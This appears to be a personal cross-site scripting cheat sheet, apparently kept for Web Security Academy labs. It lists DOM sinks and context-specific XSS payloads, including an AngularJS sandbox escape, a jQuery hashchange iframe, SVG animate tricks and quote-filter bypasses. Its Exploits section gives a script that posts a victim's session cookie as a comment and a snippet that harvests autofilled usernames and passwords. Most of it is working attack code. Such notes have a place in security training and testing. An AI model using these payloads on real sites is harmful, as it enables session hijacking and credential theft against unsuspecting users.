**use DOM-invader**
## Sinks
* `document.write`
* jQuery's `attr()` funciton, Example
```js
$("img").attr("src", "example.com")
```


## HTML - Context

### href
`javascript:alert(1)` 

### rel="canonical"
Triggers XSS on `ALT+SHIFT+X`
```
<link rel="canonical" href=... accesskey="x" onclick="alert(1)">
```

## Angular

* If `ng-app` is enabled -> XSS withot angle brackets
```
{{$on.constructor('alert(1)')()}}
```

### JQuery
*popular* `$(window).on('hashchange'`
-> trigger hashchange on attacker server
```js
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

### Tricks
Use animate to set href attribute:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

* Use `&` in payload - get parameter and whole parameter might be parsed differently
* `onerror=alert;throw 1`
* `&apos;` -> Substitute for `'` (the `;` is part of the element!)


#### Bypass `'` and `"` filter with `&apos`

## `<script>` Context
1. Terminate Existing script `</script><img src=...`
2. Bypass filters
```
5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
### template literal 
```
`${alert(1)}`
```

# Exploits
Steal cookie and post as comment
```html
<!-- type module to allow await -->
<script type="module">
// Grab CSRF
const csrf = document.querySelector('[name="csrf"]').value;
const url = "https://0ab0009604f562a28107b12700a90002.web-security-academy.net/post/comment"
const response = await fetch(url, {
    method: "POST",
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams(
        {
            csrf:csrf,
            postId:9,
            comment:"my session cookie is:" + document.cookie,
            name:"c",
            email:"a@a",
            website:"http://"
        }

    ).toString()
}).then(()=>console.log("Success!"));
</script>
```
## Steal autofill login
```js

// Create Username and password elements
var userEle = document.createElement("input");
userEle.name = "username";
var passwdEle = document.createElement("input");
passwdEle.name = "password";
passwdEle.type = "password";
[userEle, passwdEle].forEach((ele) => {
    document.body.appendChild(ele);
});
// Username and password are now in these values
var user = userEle.value;
var pass = passwdEle.value;
```

## Troubleshooting Exploits
* Check on different browser
